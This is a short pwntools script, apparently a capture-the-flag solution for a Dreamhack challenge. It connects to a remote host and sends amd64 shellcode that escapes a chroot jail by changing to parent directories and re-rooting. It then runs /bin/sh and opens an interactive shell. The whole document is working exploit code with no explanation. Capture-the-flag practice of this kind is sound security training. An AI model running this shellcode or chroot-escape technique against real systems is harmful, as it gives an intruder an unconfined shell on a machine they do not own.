from pwn import *

p = remote('host3.dreamhack.games', 14164)

context.arch = 'amd64'
context.log_level = 'debug'

shell = shellcraft.chdir("../../../")
shell += shellcraft.chroot(".")
shell += shellcraft.execve("/bin/sh", 0, 0)

p.sendlineafter(b"shellcode: ", asm(shell))

p.interactive()
